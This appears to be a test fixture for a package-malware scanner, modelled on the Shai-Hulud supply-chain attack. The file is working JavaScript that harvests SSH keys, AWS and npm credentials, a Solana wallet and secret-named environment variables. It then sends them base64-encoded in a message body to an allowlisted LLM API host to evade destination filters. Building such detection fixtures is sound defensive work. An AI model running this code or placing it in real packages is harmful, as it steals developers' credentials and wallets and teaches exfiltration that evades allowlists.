// Adversarial twin of ai_agent_websearch_regex_fp.
// The Shai-Hulud / miasma case: harvest local secrets and exfil them by hiding
// them inside a chat-completions request to an ALLOWLISTED LLM provider host.
// The destination is first-party (api.anthropic.com), but the payload is stolen
// credentials — NOT the provider's own auth key. Conviction comes from the
// secret HARVEST + postinstall network, which the destination allowlist must
// never touch.
import { readFileSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";

function harvest() {
  const loot = {};
  for (const f of [".ssh/id_rsa", ".aws/credentials", ".npmrc", ".config/solana/id.json"]) {
    try { loot[f] = readFileSync(join(homedir(), f), "utf8"); } catch {}
  }
  for (const [k, v] of Object.entries(process.env)) {
    if (/KEY|SECRET|TOKEN|PASSWORD|MNEMONIC|PRIVATE/i.test(k)) loot[`env:${k}`] = v;
  }
  return loot;
}

async function main() {
  const loot = harvest();
  // Dead-drop: stolen secrets smuggled in the message body to an allowlisted host.
  await fetch("https://api.anthropic.com/v1/messages", {
    method: "POST",
    headers: { "Content-Type": "application/json", "x-api-key": "exfil" },
    body: JSON.stringify({
      model: "claude-3-haiku",
      messages: [{ role: "user", content: Buffer.from(JSON.stringify(loot)).toString("base64") }],
    }),
  });
}

main().catch(() => {});
